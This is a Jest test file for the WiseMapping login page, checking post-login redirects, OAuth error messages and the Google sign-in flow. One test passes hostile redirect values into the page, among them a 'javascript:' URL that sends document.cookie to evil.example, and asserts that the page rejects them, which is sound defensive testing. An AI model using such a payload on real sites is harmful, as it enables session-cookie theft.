/*
 *    Copyright [2007-2025] [wisemapping]
 *
 *   Licensed under WiseMapping Public License, Version 1.0 (the "License").
 *   It is basically the Apache License, Version 2.0 (the "License") plus the
 *   "powered by wisemapping" text requirement on every single page;
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the license at
 *
 *       https://github.com/wisemapping/wisemapping-open-source/blob/main/LICENSE.md
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

import { fireEvent, screen, waitFor } from '@testing-library/react';

jest.mock('react-router', () => jest.requireActual('../router-mock'));
jest.mock('../../../../src/utils/redirect', () => ({
  ...jest.requireActual('../../../../src/utils/redirect'),
  leaveTo: jest.fn(),
}));

import LoginPage from '../../../../src/components/login-page';
import Client from '../../../../src/classes/client';
import { leaveTo } from '../../../../src/utils/redirect';
import { startOAuthFlow, takeOAuthFlow } from '../../../../src/utils/oauth-flow';
import { appLogger } from '../../../../src/utils/logger';
import { initAppConfig, installMatchMedia, renderPage, stubConfig } from '../helpers';
import { resetRouter, setLocation } from '../router-mock';

const setup = (url = '/c/login', signedIn = false) => {
  setLocation(url);
  const client = {
    fetchAccountInfo: jest.fn(() =>
      signedIn
        ? Promise.resolve({ email: 'ana@wisemapping.com' })
        : Promise.reject({ status: 401 }),
    ),
    login: jest.fn<Promise<void>, [unknown]>(() => Promise.resolve()),
  };
  renderPage(<LoginPage />, client as unknown as Client);
  return client;
};

describe('LoginPage', () => {
  beforeAll(async () => {
    await initAppConfig();
  });

  beforeEach(() => {
    resetRouter();
    installMatchMedia(false);
    localStorage.clear();
    sessionStorage.clear();
    jest.mocked(leaveTo).mockClear();
  });

  test('a signed-in user goes to the page in redirect', async () => {
    setup('/c/login?redirect=%2Fc%2Fmaps%2F3%2Fedit', true);
    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/c/maps/3/edit'));
  });

  test.each([
    ['javascript:fetch(%22//evil.example?%22%2Bdocument.cookie)'],
    ['https%3A%2F%2Fevil.example%2F'],
    ['%2F%2Fevil.example'],
  ])('a signed-in user is not sent to redirect=%s', async (redirect) => {
    setup(`/c/login?redirect=${redirect}`, true);
    await waitFor(() => expect(leaveTo).toHaveBeenCalledWith('/'));
  });

  test('a sign-in that came back with an error forgets its mark', async () => {
    startOAuthFlow('https://accounts.example.com/auth');
    setup('/c/login?error=oauth_failed');

    await screen.findByRole('button', { name: 'Sign in with Google' });
    expect(takeOAuthFlow()).toBeUndefined();
  });

  test('a signed-in user is redirected instead of seeing the login card', async () => {
    const client = setup('/c/login', true);

    expect(screen.getByRole('status').textContent).toBe(
      'Please wait while we validate your identity',
    );
    await waitFor(() => expect(client.fetchAccountInfo).toHaveBeenCalled());
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(screen.queryByRole('button', { name: 'Sign in with Google' })).toBeNull();
  });

  test('shows the Google login button when there is no session', async () => {
    setup();

    expect(await screen.findByRole('button', { name: 'Sign in with Google' })).toBeTruthy();
    expect(screen.getByText('Welcome')).toBeTruthy();
    expect(document.title).toBe('Login | WiseMapping');
  });

  test.each([
    [
      'oauth_failed',
      'OAuth authentication failed. Please try again or use a different sign-in method.',
    ],
    ['server_error', 'An unexpected error occurred. Please try again later.'],
    ['other', 'An error occurred during authentication. Please try again.'],
  ])('explains the OAuth error "%s"', async (code, message) => {
    setup(`/c/login?error=${code}`);
    expect(await screen.findByText(message)).toBeTruthy();
  });

  test('the Google button sends the user to the provider when configured', async () => {
    stubConfig({
      googleOauth2Enabled: true,
      googleOauth2Url: 'https://accounts.example.com/auth',
    });
    const log = jest.spyOn(appLogger, 'warn').mockImplementation(() => undefined);
    setup('/c/login?redirect=%2Fc%2Fmaps%2F3');

    fireEvent.click(await screen.findByRole('button', { name: 'Sign in with Google' }));

    expect(log).not.toHaveBeenCalled();
    expect(leaveTo).toHaveBeenCalledWith('https://accounts.example.com/auth?state=%2Fc%2Fmaps%2F3');
    expect(takeOAuthFlow()).toMatchObject({ redirect: '/c/maps/3' });
  });

  test('a provider without a URL is reported and not navigated to', async () => {
    stubConfig({ googleOauth2Enabled: true, googleOauth2Url: undefined });
    const log = jest.spyOn(appLogger, 'warn').mockImplementation(() => undefined);
    setup();

    fireEvent.click(await screen.findByRole('button', { name: 'Sign in with Google' }));

    expect(log).toHaveBeenCalledWith('Google OAuth URL is not configured.');
  });
});
